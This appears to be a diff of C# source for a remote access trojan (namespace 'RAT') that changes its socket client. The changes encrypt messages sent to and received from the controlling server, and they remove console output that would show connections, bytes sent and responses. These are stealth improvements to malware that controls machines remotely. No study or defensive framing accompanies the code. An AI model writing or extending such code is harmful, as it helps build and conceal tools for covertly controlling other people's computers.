@@ -39,11 +39,10 @@ namespace RAT
                 client.BeginConnect(remoteEP,
                     new AsyncCallback(ConnectCallback), client);
                 connectDone.WaitOne();
-                Send(client, message+"<EOF>");
+                Send(client, UDPListener.Crypto.Encrypt(message +"<EOF>"));
                 sendDone.WaitOne();
                 Receive(client);
                 receiveDone.WaitOne();
-                Console.WriteLine("Response received : {0}", response);
                 client.Shutdown(SocketShutdown.Both);
                 client.Close();
 
@@ -60,8 +59,6 @@ namespace RAT
             {
                 Socket client = (Socket)ar.AsyncState;
                 client.EndConnect(ar);
-                Console.WriteLine("Socket connected to {0}",
-                    client.RemoteEndPoint.ToString());
                 connectDone.Set();
             }
             catch (Exception e)
@@ -69,7 +66,6 @@ namespace RAT
                 Console.WriteLine(e.ToString());
             }
         }
-
         private static void Receive(Socket client)
         {
             try
@@ -84,7 +80,6 @@ namespace RAT
                 Console.WriteLine(e.ToString());
             }
         }
-
         private static void ReceiveCallback(IAsyncResult ar)
         {
             try
@@ -103,7 +98,7 @@ namespace RAT
                 {
                     if (state.sb.Length > 1)
                     {
-                        response = state.sb.ToString();
+                        response = UDPListener.Crypto.Decrypt(state.sb.ToString());
                     }
                     receiveDone.Set();
                 }
@@ -127,7 +122,6 @@ namespace RAT
             {
                 Socket client = (Socket)ar.AsyncState;
                 int bytesSent = client.EndSend(ar);
-                Console.WriteLine("Sent {0} bytes to server.", bytesSent);
                 sendDone.Set();
             }
             catch (Exception e)
